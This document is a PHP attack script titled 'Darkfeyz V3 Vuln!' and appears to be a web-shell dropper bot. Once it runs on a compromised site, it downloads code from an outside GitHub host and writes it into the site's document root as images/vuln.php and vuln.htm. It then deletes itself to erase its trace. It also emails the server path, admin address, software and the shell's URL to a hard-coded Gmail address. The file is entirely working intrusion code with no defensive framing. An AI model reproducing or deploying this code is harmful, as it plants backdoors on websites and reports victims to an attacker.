<title>Darkfeyz V3 Vuln!</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/images/vuln.php" ;
$text = http_get('https://raw.githubusercontent.com/D4feyz/botv3/master/up.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = http_get('https://raw.githubusercontent.com/D4feyz/botv3/master/vuln.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>

<?php
$kime="hiphoptra@gmail.com";
$baslik="Darkfeyz Shell BotV3";
$spyhackerz="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
$spyhackerz.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
$spyhackerz.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
$spyhackerz.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
$spyhackerz.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
mail($kime, $baslik, $spyhackerz);
?>
